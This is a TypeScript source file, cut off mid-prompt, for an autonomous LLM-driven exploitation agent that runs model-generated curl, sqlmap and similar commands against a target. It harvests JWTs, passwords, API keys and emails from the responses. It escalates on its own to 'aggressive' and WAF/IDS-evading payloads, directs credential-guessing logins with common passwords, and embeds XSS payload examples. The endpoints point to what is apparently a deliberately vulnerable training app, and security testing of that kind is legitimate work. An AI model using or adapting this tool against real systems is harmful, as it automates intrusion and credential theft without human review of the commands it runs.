import { BaseAgent, type AgentConfig } from './base-agent.js';
import type { SwarmEvent, SwarmEventType } from '../events/types.js';
import { LLMRouter } from '../core/llm-router.js';
import type { LLMMessage } from '../core/providers/ollama.js';
import type { ExecResult } from '../core/tools/types.js';
import { loadAgentPrompt } from '../utils/prompt-loader.js';
import { AGENT_MODEL_CONFIG } from '../core/models.js';
import fs from 'fs';
import path from 'path';

interface ExploitCommand {
  id: string;
  tool: string;
  command: string;
  exploitType: string;
  target: string;
  timestamp: number;
}

interface Finding {
  type: 'credential' | 'token' | 'secret' | 'endpoint' | 'vulnerability' | 'info';
  value: string;
  source: string;
  timestamp: number;
}

interface IterationResult {
  iteration: number;
  commandsRun: number;
  commandsSuccessful: number;
  newFindings: Finding[];
  escalationLevel: string;
  timestamp: number;
}

interface GammaExploitState {
  missionId: string;
  target: string;
  targetUrl: string;
  iteration: number;
  maxIterations: number;
  commandsRun: Map<string, ExploitCommand>;
  findings: Finding[];
  iterationResults: IterationResult[];
  active: boolean;
  escalationLevel: 'baseline' | 'aggressive' | 'evasive';
  sessionObtained: boolean;
  validJWT: string | null;
  authenticated: boolean;
  hasValidJWT: boolean;
  authAttempts: number;
  maxAuthAttempts: number;
  authFocusMode: boolean;
  loginResponse: { success: boolean; token?: string; error?: string } | null;
}

interface ParsedCommands {
  reasoning: string;
  commands: Array<{
    tool: string;
    command: string;
    exploitType: string;
  }>;
}

interface CommandResult {
  command: ExploitCommand;
  stdout: string;
  stderr: string;
  exit_code: number;
  timed_out: boolean;
  success: boolean;
  finding?: Finding;
}

export interface GammaConfig extends AgentConfig {
  agentType: 'gamma';
  maxIterations?: number;
  reportPath?: string;
}

export class GammaAgent extends BaseAgent {
  private llmRouter: LLMRouter;
  private exploitState: Map<string, GammaExploitState> = new Map();
  private readonly DEFAULT_MAX_ITERATIONS = 15;
  private readonly COMMAND_HASH_SIZE = 16;
  private agentMaxIterations: number;

  constructor(config: GammaConfig) {
    super(config);
    this.llmRouter = new LLMRouter();
    this.agentMaxIterations = config.maxIterations || this.DEFAULT_MAX_ITERATIONS;

    const gammaConfig = AGENT_MODEL_CONFIG['gamma'];
    console.log(`[${this.agentId}] Model: ${gammaConfig?.primary} (${gammaConfig?.provider}) | Max Tokens: ${gammaConfig?.maxTokens} | Context: ${gammaConfig?.contextWindow} | Max Iterations: ${this.agentMaxIterations}`);
  }

  protected getSubscriptions(): SwarmEventType[] {
    return [
      'scan_initiated',
      'mission_authorized',
    ];
  }

  async processEvent(event: SwarmEvent): Promise<void> {
    console.log(`[${this.agentId}] Processing event: ${event.type}`, event.payload);

    switch (event.type) {
      case 'scan_initiated':
        await this.handleScanInitiated(event);
        break;
      case 'mission_authorized':
        await this.handleMissionAuthorized(event);
        break;
      default:
        console.log(`[${this.agentId}] Unhandled event type: ${event.type}`);
    }
  }

  private async handleScanInitiated(event: SwarmEvent): Promise<void> {
    const { missionId, target, targetUrl } = event.payload as {
      missionId: string;
      target: string;
      targetUrl: string;
    };

    console.log(`[${this.agentId}] === handleScanInitiated called ===`);
    console.log(`[${this.agentId}] Event payload:`, JSON.stringify(event.payload));
    console.log(`[${this.agentId}] Current state before: ${this.state}`);

    console.log(`[${this.agentId}] Starting exploit phase for ${target} (${targetUrl})`);

    await this.initializeExploitState(missionId, target, targetUrl, this.agentMaxIterations);
    this.transitionTo('ACTIVE', 'exploit started');

    console.log(`[${this.agentId}] State after transition: ${this.state}`);

    try {
      console.log(`[${this.agentId}] Calling runExploitLoop...`);
      await this.runExploitLoop(missionId);
    } catch (error) {
      console.error(`[${this.agentId}] Exploit loop failed for ${target}:`, error);
      this.handleError(error);
    }
  }

  private async handleMissionAuthorized(event: SwarmEvent): Promise<void> {
    const { missionId, executor, target, targetUrl } = event.payload as {
      missionId: string;
      executor: string;
      target: string;
      targetUrl: string;
    };

    if (executor === 'gamma' || executor === 'alpha') {
      console.log(`[${this.agentId}] Gamma authorized for mission ${missionId}`);
      await this.initializeExploitState(missionId, target, targetUrl, this.agentMaxIterations);
      this.transitionTo('ACTIVE', 'mission authorized');

      try {
        await this.runExploitLoop(missionId);
      } catch (error) {
        console.error(`[${this.agentId}] Exploit loop failed:`, error);
        this.handleError(error);
      }
    }
  }

  

  private async initializeExploitState(missionId: string, target: string, targetUrl: string, maxIterations?: number): Promise<GammaExploitState> {
    let state = this.exploitState.get(missionId);

    if (!state) {
      const maxIters = maxIterations || this.agentMaxIterations;
      state = {
        missionId,
        target,
        targetUrl,
        iteration: 0,
        maxIterations: maxIters,
        commandsRun: new Map(),
        findings: [],
        iterationResults: [],
        active: true,
        escalationLevel: 'baseline',
        sessionObtained: false,
        validJWT: null,
        authenticated: false,
        hasValidJWT: false,
        authAttempts: 0,
        maxAuthAttempts: 10,
        authFocusMode: true,
        loginResponse: null,
      };
      this.exploitState.set(missionId, state);
    }

    return state;
  }

  private async runExploitLoop(missionId: string): Promise<void> {
    const state = this.exploitState.get(missionId);
    if (!state) {
      console.error(`[${this.agentId}] No state found for mission ${missionId}`);
      return;
    }

    const findingsReport = await this.readFindingsReport(missionId);
    const conversationHistory: LLMMessage[] = [];

    console.log(`[${this.agentId}] Starting exploit loop for mission ${missionId}`);
    console.log(`[${this.agentId}] Target: ${state.targetUrl} | Escalation: ${state.escalationLevel}`);
    console.log(`[${this.agentId}] Readings findings report (${findingsReport.length} chars)`);
    console.log(`[${this.agentId}] Loop config: maxIterations=${state.maxIterations}, active=${state.active}`);

    while (state.active && state.iteration < state.maxIterations) {
      state.iteration++;
      console.log(`\n[${this.agentId}] === Iteration ${state.iteration}/${state.maxIterations} ===`);

      const findingsReport = await this.readFindingsReport(missionId);

      try {
        const shouldContinue = await this.executeExploitIteration(state, findingsReport, conversationHistory);

        if (!shouldContinue) {
          console.log(`[${this.agentId}] Exploit loop terminating - no more targets or max iterations reached`);
          break;
        }

        await this.selfCriticReflection(state, conversationHistory);

      } catch (error) {
        console.error(`[${this.agentId}] Iteration ${state.iteration} failed:`, error);
        conversationHistory.push({
          role: 'user',
          content: `Iteration failed with error: ${error}. Provide alternative approach.`
        });
      }
    }

    console.log(`[${this.agentId}] Exploit loop exiting: active=${state.active}, iteration=${state.iteration}, max=${state.maxIterations}`);
    await this.finalizeExploitSession(state);
  }

  private async executeExploitIteration(
    state: GammaExploitState,
    findingsReport: string,
    conversationHistory: LLMMessage[]
  ): Promise<boolean> {
    console.log(`[${this.agentId}] Building exploit prompt...`);
    const systemPrompt = this.buildExploitSystemPrompt(state);
    const allCommandsStr = Array.from(state.commandsRun.values())
      .map(c => `[${c.exploitType}] ${c.tool}: ${c.command}`)
      .join('\n');

    const findingsStr = state.findings
      .map(f => `[${f.type}] ${f.value} (from ${f.source})`)
      .join('\n');

    const prompt = this.buildExploitPrompt(state, findingsReport, allCommandsStr, findingsStr);

    const messages: LLMMessage[] = [
      { role: 'system', content: systemPrompt },
      ...conversationHistory.slice(-10),
      { role: 'user', content: prompt },
    ];

    const reportDir = `${process.env.HOME || '/home/peburu'}/exploit-reports/${state.missionId}`;
    fs.mkdirSync(reportDir, { recursive: true });
    const llmInputPath = path.join(reportDir, `llm_input_iter${state.iteration}.md`);

    let llmInputLog = `# LLM Input - Iteration ${state.iteration}\n\n`;
    llmInputLog += `## System Prompt (${systemPrompt.length} chars)\n\n${systemPrompt}\n\n`;
    llmInputLog += `## Conversation History (${conversationHistory.length} messages)\n\n`;
    for (const msg of conversationHistory.slice(-10)) {
      llmInputLog += `### ${msg.role}\n\n${msg.content}\n\n---\n\n`;
    }
    llmInputLog += `## User Prompt (${prompt.length} chars)\n\n${prompt}\n`;

    fs.writeFileSync(llmInputPath, llmInputLog);
    console.log(`[${this.agentId}] LLM input logged to: ${llmInputPath}`);

    const response = await this.llmRouter.complete('gamma', messages, { temperature: 0.7 });

    const llmOutputPath = path.join(reportDir, `llm_output_iter${state.iteration}.txt`);
    fs.writeFileSync(llmOutputPath, response);
    console.log(`[${this.agentId}] LLM output logged to: ${llmOutputPath}`);

    const parsed = this.parseLlmExploitResponse(response);

    if (!parsed.commands || parsed.commands.length === 0) {
      console.log(`[${this.agentId}] LLM returned no valid commands, attempting reflection`);
      conversationHistory.push({ role: 'assistant', content: response });
      conversationHistory.push({
        role: 'user',
        content: 'No valid commands generated. Analyze findings and generate specific exploit commands.'
      });
      return true;
    }

    conversationHistory.push({ role: 'assistant', content: response });

    const newCommands = parsed.commands.filter(cmd => {
      const hash = this.hashCommand(cmd.command);
      if (state.commandsRun.has(hash)) {
        console.log(`[${this.agentId}] Skipping duplicate command: ${cmd.command}`);
        return false;
      }
      return true;
    });

    if (newCommands.length === 0) {
      console.log(`[${this.agentId}] All generated commands already run`);
      return false;
    }

    console.log(`[${this.agentId}] Running ${newCommands.length} new commands in parallel`);

    const results = await this.executeCommandsParallel(newCommands, state);

    const successfulResults = results.filter(r => r.success);
    console.log(`[${this.agentId}] Results: ${successfulResults.length}/${results.length} successful`);

    for (const result of results) {
      state.commandsRun.set(this.hashCommand(result.command.command), result.command);

      if (result.finding) {
        state.findings.push(result.finding);
        console.log(`[${this.agentId}] FINDING: [${result.finding.type}] ${result.finding.value}`);
      }

      if (result.success) {
        const extractedFindings = this.extractFindingsFromResult(result);
        for (const finding of extractedFindings) {
          if (!state.findings.some(f => f.value === finding.value && f.type === finding.type)) {
            state.findings.push(finding);
            console.log(`[${this.agentId}] EXTRACTED: [${finding.type}] ${finding.value}`);
          }
        }
      }
    }

    state.iterationResults.push({
      iteration: state.iteration,
      commandsRun: results.length,
      commandsSuccessful: successfulResults.length,
      newFindings: results.flatMap(r => r.finding ? [r.finding] : []),
      escalationLevel: state.escalationLevel,
      timestamp: Date.now(),
    });

    await this.saveIterationReport(state, results);

    const resultSummary = this.buildResultSummary(results);
    conversationHistory.push({
      role: 'user',
      content: resultSummary
    });

    return successfulResults.length > 0 || newCommands.length > 0;
  }

  private hasPlaceholderToken(command: string): boolean {
    const placeholderPatterns = [
      /<[^>]*TOKEN[^>]*>/i,
      /<[^>]*JWT[^>]*>/i,
      /<[^>]*NEWLY[^>]*>/i,
      /Bearer\s+<[^>]+>/i,
    ];

    for (const pattern of placeholderPatterns) {
      if (pattern.test(command)) {
        console.log(`[${this.agentId}] REJECT: Command contains placeholder token`);
        return true;
      }
    }
    return false;
  }

  private async executeCommandsParallel(
    commands: Array<{ tool: string; command: string; exploitType: string }>,
    state: GammaExploitState
  ): Promise<CommandResult[]> {
    const execPromises = commands.map(async (cmd) => {
      if (this.hasPlaceholderToken(cmd.command)) {
        const exploitCmd: ExploitCommand = {
          id: `cmd-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          tool: cmd.tool,
          command: cmd.command,
          exploitType: cmd.exploitType,
          target: state.targetUrl,
          timestamp: Date.now(),
        };
        return {
          command: exploitCmd,
          stdout: '{"error": "MISSING_RUNTIME_TOKEN", "details": "You used a placeholder token; wait until a real JWT is obtained from /rest/user/authentication before constructing authenticated requests."}',
          stderr: '',
          exit_code: -1,
          timed_out: false,
          success: false,
          finding: undefined,
        };
      }

      if (!state.hasValidJWT && cmd.command.includes('Authorization:')) {
        const exploitCmd: ExploitCommand = {
          id: `cmd-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
          tool: cmd.tool,
          command: cmd.command,
          exploitType: cmd.exploitType,
          target: state.targetUrl,
          timestamp: Date.now(),
        };
        return {
          command: exploitCmd,
          stdout: '{"error": "NO_ACTIVE_SESSION", "details": "No valid JWT obtained yet. Focus on obtaining a session via /rest/user/login first (NOTE: /rest/user/authentication may return 500 - use /rest/user/login instead), then use Authorization headers."}',
          stderr: '',
          exit_code: -1,
          timed_out: false,
          success: false,
          finding: undefined,
        };
      }

      const exploitCmd: ExploitCommand = {
        id: `cmd-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`,
        tool: cmd.tool,
        command: cmd.command,
        exploitType: cmd.exploitType,
        target: state.targetUrl,
        timestamp: Date.now(),
      };

      try {
        const result = await this.executeCommand(cmd.command, 30000);

        const finding = this.checkForFinding(cmd.command, result.stdout, result.stderr, cmd.exploitType, state);

        const isAuthEndpoint = cmd.command.includes('/rest/user/authentication') || cmd.command.includes('/rest/user/login');
        const isLoginCommand = isAuthEndpoint && cmd.command.includes('POST');
        if (isLoginCommand) {
          state.authAttempts++;
          console.log(`[${this.agentId}] Auth attempt ${state.authAttempts}/${state.maxAuthAttempts}`);
          const loginResult = this.parseLoginResponse(result.stdout || '', result.stderr);
          state.loginResponse = loginResult;
          console.log(`[${this.agentId}] Login response: success=${loginResult.success}, error=${loginResult.error}`);

          if (loginResult.success && loginResult.token) {
            state.sessionObtained = true;
            state.validJWT = loginResult.token;
            state.authenticated = true;
            state.hasValidJWT = true;
            state.authFocusMode = false;
            console.log(`[${this.agentId}] AUTH SUCCESS: Obtained valid JWT`);
            console.log(`[${this.agentId}] JWT: ${loginResult.token}`);
          } else if (state.authAttempts >= state.maxAuthAttempts) {
            console.log(`[${this.agentId}] Auth attempts exhausted, disabling auth focus mode`);
            state.authFocusMode = false;
          }
        }

        if (!state.hasValidJWT) {
          const authResult = this.isAuthenticationSuccess(result.stdout || '');
          if (authResult && authResult.success && authResult.token) {
            if (this.isValidJWT(authResult.token)) {
              state.sessionObtained = true;
              state.validJWT = authResult.token;
              state.authenticated = true;
              state.hasValidJWT = true;
              state.authFocusMode = false;
              console.log(`[${this.agentId}] AUTH SUCCESS: Obtained valid JWT`);
              console.log(`[${this.agentId}] JWT: ${authResult.token}`);
            }
          }
        }

        const success = this.evaluateExploitSuccess(result, cmd.exploitType);

        return {
          command: exploitCmd,
          stdout: result.stdout || '',
          stderr: result.stderr || '',
          exit_code: result.exit_code ?? -1,
          timed_out: result.timed_out ?? false,
          success: success || (state.loginResponse?.success ?? false),
          finding,
        };
      } catch (error) {
        console.error(`[${this.agentId}] Command failed: ${cmd.command} Error: ${error}`);
        return {
          command: exploitCmd,
          stdout: '',
          stderr: String(error),
          exit_code: -1,
          timed_out: false,
          success: false,
        };
      }
    });

    return Promise.all(execPromises);
  }

  private isFalsePositiveSecret(value: string, source: string): boolean {
    const lower = value.toLowerCase();
    const sourceLower = source.toLowerCase();

    if (/^--[a-z]/.test(value)) return true;
    if (/^[A-Z_]{10,}$/.test(value)) return true;
    if (/_seconds|_count|_total|_duration/.test(lower)) return true;
    if (/session will|password hash|please/i.test(value)) return true;
    if (value.includes('tooltip') || value.includes('mat-')) return true;
    if (value.includes('startup_duration') || value.includes('juiceshop_startup')) return true;
    if (sourceLower.includes('/metrics') && /_total|_count|_seconds/.test(lower)) return true;
    if (sourceLower.includes('/challenges') && /challenge|ctf|prevention|vulnerability|dependency/i.test(lower)) return true;
    if (sourceLower.includes('/i18n') || sourceLower.includes('/en.json')) return true;
    if (/^[a-f0-9]{10,}o欠/.test(value)) return false;
    if (value.length < 16) return true;
    if (/^[A-Za-z0-9_]{20,}$/.test(value) && !/[!@#$%^&*()]/.test(value) && !/[A-Z].*[a-z]|[a-z].*[A-Z]/.test(value)) return true;

    return false;
  }

  private checkForFinding(
    command: string,
    stdout: string,
    stderr: string,
    _exploitType: string,
    state: GammaExploitState
  ): Finding | undefined {
    const combined = `${stdout} ${stderr}`;

    const credentialPatterns: Array<{ pattern: RegExp; type: Finding['type'] }> = [
      { pattern: /"token"\s*:\s*"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*"/i, type: 'token' },
      { pattern: /Authorization:\s*Bearer\s+eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*/i, type: 'token' },
      { pattern: /jwt\s*=\s*["']?eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*["']?/i, type: 'token' },
      { pattern: /"password"\s*:\s*"[^"]{8,}"/i, type: 'credential' },
      { pattern: /"pass"\s*:\s*"[^"]{8,}"/i, type: 'credential' },
      { pattern: /"pwd"\s*:\s*"[^"]{8,}"/i, type: 'credential' },
      { pattern: /"apiKey"\s*:\s*"[^"]{20,}"/i, type: 'secret' },
      { pattern: /"api_key"\s*:\s*"[^"]{20,}"/i, type: 'secret' },
      { pattern: /"secret"\s*:\s*"[^"]{20,}"/i, type: 'secret' },
      { pattern: /"bearer"\s*:\s*"[^"]{20,}"/i, type: 'token' },
      { pattern: /"token"\s*:\s*"[^"]{20,}"/i, type: 'token' },
      { pattern: /csrf[_\s-]?token["\s:]+[^\s,}<"\]]+/i, type: 'token' },
      { pattern: /x-api-key["\s:]+[^\s,}<"\]]{20,}/i, type: 'secret' },
      { pattern: /x-auth-token["\s:]+[^\s,}<"\]]{20,}/i, type: 'token' },
    ];

    for (const { pattern, type } of credentialPatterns) {
      const match = combined.match(pattern);
      if (match && match[0].length > 3) {
        const rawValue = match[0];
        if (this.isFalsePositiveSecret(rawValue, command)) continue;

        const value = rawValue;
        console.log(`[${this.agentId}] FINDING: found ${type} pattern "${value}"`);

        if (type === 'token' && value.includes('eyJ')) {
          const jwtMatch = value.match(/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*/);
          if (jwtMatch) {
            console.log(`[${this.agentId}] Checking JWT: "${jwtMatch[0]}"`);
            if (this.isValidJWT(jwtMatch[0])) {
              state.sessionObtained = true;
              state.validJWT = jwtMatch[0];
              state.authenticated = true;
              state.hasValidJWT = true;
              state.authFocusMode = false;
              console.log(`[${this.agentId}] AUTH SUCCESS: JWT found via pattern match and validated`);
              console.log(`[${this.agentId}] JWT: ${jwtMatch[0]}`);
            } else {
              console.log(`[${this.agentId}] JWT validation failed for: "${jwtMatch[0]}"`);
            }
          } else {
            console.log(`[${this.agentId}] No JWT pattern found in value: "${value}"`);
          }
        }

        return {
          type,
          value,
          source: `command: ${command}`,
          timestamp: Date.now(),
        };
      }
    }

    const jwtPattern = /eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*/g;
    const tokens = combined.match(jwtPattern);
    if (tokens) {
      for (const token of tokens.slice(0, 3)) {
        if (token.length > 50 && this.isValidJWT(token)) {
          console.log(`[${this.agentId}] FINDING: found valid JWT token`);
          state.sessionObtained = true;
          state.validJWT = token;
          state.authenticated = true;
          state.hasValidJWT = true;
          state.authFocusMode = false;
          console.log(`[${this.agentId}] AUTH SUCCESS: JWT extracted from response`);
          return {
            type: 'token',
            value: `jwt: ${token}`,
            source: `command: ${command}`,
            timestamp: Date.now(),
          };
        }
      }
    }

    const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
    const emails = combined.match(emailPattern);
    if (emails) {
      for (const email of emails.slice(0, 5)) {
        if (!email.includes('example') && !email.includes('test@')) {
          console.log(`[${this.agentId}] FINDING: found email ${email}`);
          return {
            type: 'info',
            value: `email: ${email}`,
            source: `command: ${command}`,
            timestamp: Date.now(),
          };
        }
      }
    }

    return undefined;
  }

  private isValidJWT(token: string): boolean {
    if (!token || token.length < 20) return false;

    const parts = token.split('.');
    if (parts.length !== 3) return false;

    for (const part of parts) {
      if (!part || part.length < 4) return false;
      if (!/^[a-zA-Z0-9_-]+$/.test(part)) return false;
    }

    try {
      const headerPart = parts[0] as string;
      const payloadPart = parts[1] as string;
      const headerDecoded = Buffer.from(headerPart.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
      if (headerDecoded.includes('\x00')) return false;

      const payloadDecoded = Buffer.from(payloadPart.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
      if (payloadDecoded.includes('\x00')) return false;

      const payload = JSON.parse(payloadDecoded);
      if (!payload.iat && !payload.exp) return false;

      return true;
    } catch {
      return false;
    }
  }

  private isAuthenticationSuccess(response: string): { success: boolean; token?: string } {
    try {
      const json = JSON.parse(response);
      if (json.token && typeof json.token === 'string' && json.token.startsWith('eyJ')) {
        if (this.isValidJWT(json.token)) {
          return { success: true, token: json.token };
        }
      }
      if (json.authentication && json.token) {
        return { success: true, token: json.token };
      }
      if (json.data && json.data.token) {
        return { success: true, token: json.data.token };
      }
    } catch {
    }
    return { success: false };
  }

  private parseLoginResponse(stdout: string, stderr: string): { success: boolean; token?: string; error?: string } {
    if (!stdout || stdout.trim() === '') {
      return { success: false, error: 'empty_response' };
    }

    try {
      const json = JSON.parse(stdout);

      if (json.token && typeof json.token === 'string') {
        if (json.token.startsWith('eyJ')) {
          if (this.isValidJWT(json.token)) {
            return { success: true, token: json.token };
          }
        }
        if (json.token.length > 20) {
          return { success: true, token: json.token };
        }
      }

      if (json.authentication && json.token) {
        return { success: true, token: json.token };
      }

      if (json.data && json.data.token) {
        return { success: true, token: json.data.token };
      }

      if (json.error) {
        return { success: false, error: String(json.error) };
      }

      if (json.message && /invalid|wrong|failed|error|unauthorized/i.test(String(json.message))) {
        return { success: false, error: String(json.message) };
      }

      return { success: false, error: 'no_token_in_response' };
    } catch (e) {
      const lower = (stdout + stderr).toLowerCase();
      if (lower.includes('invalid') || lower.includes('unauthorized') || lower.includes('wrong')) {
        return { success: false, error: 'auth_failed_text_response' };
      }
      return { success: false, error: 'non_json_response' };
    }
  }

  private extractFindingsFromResult(_result: CommandResult): Finding[] {
    return [];
  }

  private evaluateExploitSuccess(result: ExecResult, _exploitType: string): boolean {
    if (result.timed_out) {
      console.log(`[${this.agentId}] FAIL: timed out`);
      return false;
    }

    const stdout = result.stdout || '';
    const stderr = result.stderr || '';
    const combined = `${stdout} ${stderr}`;
    const firstLine = combined.split('\n')[0];

    if (result.exit_code === 0) {
      const hasContent = stdout.length > 0 || stderr.length > 0;
      if (hasContent) {
        console.log(`[${this.agentId}] SUCCESS: exit_code=0 with content (${stdout.length} bytes)`);
        return true;
      }
    }

    if (result.exit_code !== 0 && result.exit_code !== undefined) {
      console.log(`[${this.agentId}] FAIL: exit_code=${result.exit_code}`);
      return false;
    }

    const httpSuccessPatterns = [
      /HTTP\/\d\.\d\s+20\d/i,
      /HTTP\/\d\.\d\s+30\d/i,
      /<[a-z]+[^>]*>/i,
    ];

    for (const pattern of httpSuccessPatterns) {
      if (pattern.test(combined)) {
        console.log(`[${this.agentId}] SUCCESS: matched HTTP/content pattern`);
        return true;
      }
    }

    const criticalFailurePatterns = [
      /connection refused/i,
      /timeout/i,
      /no route to host/i,
      /name or service not known/i,
      /curl: \(\d+\)/i,
    ];

    for (const pattern of criticalFailurePatterns) {
      if (pattern.test(combined)) {
        console.log(`[${this.agentId}] FAIL: critical failure pattern matched`);
        return false;
      }
    }

    if (combined.length > 50) {
      console.log(`[${this.agentId}] SUCCESS: meaningful output (${combined.length} chars)`);
      return true;
    }

    console.log(`[${this.agentId}] FAIL: no success indicators on "${firstLine}"`);
    return false;
  }

  private async selfCriticReflection(
    state: GammaExploitState,
    conversationHistory: LLMMessage[]
  ): Promise<void> {
    if (state.sessionObtained && state.validJWT) {
      console.log(`[${this.agentId}] Self-critic: Valid JWT obtained! Escalating to aggressive.`);
      if (state.escalationLevel === 'baseline') {
        state.escalationLevel = 'aggressive';
        console.log(`[${this.agentId}] Self-critic: Escalating to aggressive mode due to valid session`);
      }
      conversationHistory.push({
        role: 'user',
        content: `CRITICAL: Valid JWT obtained! Token: ${state.validJWT} Use this token for authenticated requests.`
      });
      return;
    }

    if (state.authenticated) {
      console.log(`[${this.agentId}] Self-critic: Authentication successful!`);
      if (state.escalationLevel === 'baseline') {
        state.escalationLevel = 'aggressive';
      }
      return;
    }

    if (state.findings.length === 0) {
      console.log(`[${this.agentId}] Self-critic: No findings yet, analyzing approach...`);

      const reflectionPrompt = `Analyze the exploit results and suggest improvements:

Target: ${state.targetUrl}
Escalation Level: ${state.escalationLevel}
Iteration: ${state.iteration}
Commands Run: ${state.commandsRun.size}
Findings: None yet

Based on the results, should we:
1. Try more aggressive payloads?
2. Focus on different exploit types?
3. Target different endpoints?
4. Change escalation level?

Provide specific recommendations for the next iteration.`;

      const messages: LLMMessage[] = [
        { role: 'system', content: 'You are a security expert critiquing exploit attempts. Be concise and actionable.' },
        { role: 'user', content: reflectionPrompt },
      ];

      try {
        const reflection = await this.llmRouter.complete('gamma', messages);
        console.log(`[${this.agentId}] Self-critic reflection:\n${reflection}`);

        if (reflection.includes('escalate') || reflection.includes('aggressive')) {
          if (state.escalationLevel === 'baseline') {
            state.escalationLevel = 'aggressive';
            console.log(`[${this.agentId}] Self-critic: Escalating to aggressive mode`);
          }
        }

        conversationHistory.push({ role: 'user', content: `Self-critic: ${reflection}` });
      } catch (error) {
        console.error(`[${this.agentId}] Self-critic failed:`, error);
      }
    } else {
      console.log(`[${this.agentId}] Self-critic: ${state.findings.length} findings collected`);

      const criticalFinding = state.findings.find(f =>
        f.type === 'credential' || f.type === 'token'
      );

      if (criticalFinding) {
        console.log(`[${this.agentId}] Self-critic: Critical finding detected - ${criticalFinding.type}`);
        conversationHistory.push({
          role: 'user',
          content: `CRITICAL FINDING: [${criticalFinding.type}] ${criticalFinding.value}. Next steps?`
        });
      }
    }
  }

  private parseLlmExploitResponse(response: string): ParsedCommands {
    const result: ParsedCommands = {
      reasoning: '',
      commands: [],
    };

    const reasoningMatch = response.match(/<reasoning>([\s\S]*?)<\/reasoning>/i);
    if (reasoningMatch && reasoningMatch[1]) {
      result.reasoning = reasoningMatch[1].trim();
    }

    const tTagRegex = /<t>(\w+)<\/t>/gi;
    const cTagRegex = /<c>([\s\S]*?)<\/c>/gi;
    const exploitTypeRegex = /<exploit_type>(\w+)<\/exploit_type>/gi;

    const tMatches = response.match(tTagRegex);
    const cMatches = response.match(cTagRegex);
    const exploitTypeMatches = response.match(exploitTypeRegex);

    if (tMatches && cMatches) {
      for (let i = 0; i < Math.min(tMatches.length, cMatches.length); i++) {
        const tMatch = tMatches[i];
        const cMatch = cMatches[i];
        if (!tMatch || !cMatch) continue;

        const tool = tMatch.replace(/<\/?t>/gi, '').trim();
        const command = cMatch.replace(/<\/?c>/gi, '').trim();

        const exploitTypeMatch = exploitTypeMatches?.[i];
        const exploitType = exploitTypeMatch
          ? exploitTypeMatch.replace(/<\/?exploit_type>/gi, '').trim()
          : 'generic';

        if (command && command.length > 0) {
          result.commands.push({ tool, command, exploitType });
        }
      }
    }

    if (result.commands.length === 0) {
      const commandRegex = /<command>([\s\S]*?)<\/command>/gi;
      const toolRegex = /<tool>(\w+)<\/tool>/gi;

      const commandMatches = response.match(commandRegex);
      const toolMatches = response.match(toolRegex);

      if (commandMatches) {
        for (let i = 0; i < commandMatches.length; i++) {
          const cmdMatch = commandMatches[i];
          if (!cmdMatch) continue;

          const command = cmdMatch
            .replace(/<\/?command>/gi, '')
            .trim();

          const toolMatch = toolMatches?.[i];
          const tool = toolMatch
            ? toolMatch.replace(/<\/?tool>/gi, '').trim()
            : 'curl';

          if (command) {
            result.commands.push({ tool, command, exploitType: 'generic' });
          }
        }
      }
    }

    if (result.commands.length === 0) {
      const lines = response.split('\n');
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.startsWith('curl ') || trimmed.startsWith('wget ') ||
            trimmed.startsWith('nuclei ') || trimmed.startsWith('sqlmap ') ||
            trimmed.startsWith('gobuster ') || trimmed.startsWith('ffuf ')) {
          const parts = trimmed.split(' ');
          result.commands.push({
            tool: parts[0] || 'curl',
            command: trimmed,
            exploitType: 'generic',
          });
        }
      }
    }

    return result;
  }

  private buildExploitSystemPrompt(state: GammaExploitState): string {
    const basePrompt = loadAgentPrompt('gamma');

    const escalationGuidance: Record<string, string> = {
      baseline: 'Use standard, simple payloads. Focus on confirming vulnerabilities exist.',
      aggressive: 'Use more sophisticated payloads, encoding variations, and bypass techniques.',
      evasive: 'Use obfuscated, encoded payloads that evade basic WAF/IDS detection.',
    };

    return `${basePrompt}

## Current Mission Context
Target: ${state.targetUrl}
Escalation Level: ${state.escalationLevel}
Mission ID: ${state.missionId}

## Escalation Guidance
${escalationGuidance[state.escalationLevel]}

## Output Format
You MUST output commands in this XML format:
<reasoning>Analysis of target and approach</reasoning>
<exploit_type>XSS</exploit_type>
<tool>curl</tool>
<command>curl -s -X GET "${state.targetUrl}/api/search?q=<script>alert(1)</script>"</command>
<command>curl -s -X POST "${state.targetUrl}/api/feedback" -H "Content-Type: application/json" -d '{"comment":"<img src=x onerror=alert(1)>"}'</command>

Generate 3-10 commands per iteration. Quality over quantity.`;
  }

  private buildExploitPrompt(
    state: GammaExploitState,
    findingsReport: string,
    commandsRun: string,
    findings: string
  ): string {
    const sessionInfo = state.sessionObtained && state.validJWT
      ? `\n## ACTIVE SESSION\nValid JWT obtained! Use this token in Authorization header:\nAuthorization: Bearer ${state.validJWT}\n`
      : '\n## SESSION\nNo valid JWT obtained yet.\n';

    const knownEmails = state.findings
      .filter(f => f.type === 'info' && f.value.includes('@'))
      .map(f => f.value.replace('email: ', ''))
      .slice(0, 5);

    const authEndpoint = '/rest/user/login';
    const authEndpointAlt = '/rest/user/authentication';
    const sqliEndpoint = '/rest/products/search';

    return `## Target
${state.targetUrl}

## Alpha Recon Findings (from findings_report.md)
${findingsReport || 'No findings report available - use your expertise to identify targets'}

${sessionInfo}

## AUTH STATE MACHINE
${state.authFocusMode ? `**MODE: AUTH FOCUS** - You MUST prioritize obtaining a valid JWT before other exploits.
- Auth attempts remaining: ${state.maxAuthAttempts - state.authAttempts}
- Has valid JWT: ${state.hasValidJWT}
- You MUST generate login attempts with known emails and common passwords.` : `**MODE: EXPLOIT** - You have a valid JWT. Focus on IDOR, XSS, SQLi, and other exploits.`}

## CRITICAL ENDPOINT CORRECTIONS (from Alpha recon)
- Authentication: POST ${authEndpoint} with {"email":"...", "password":"..."}
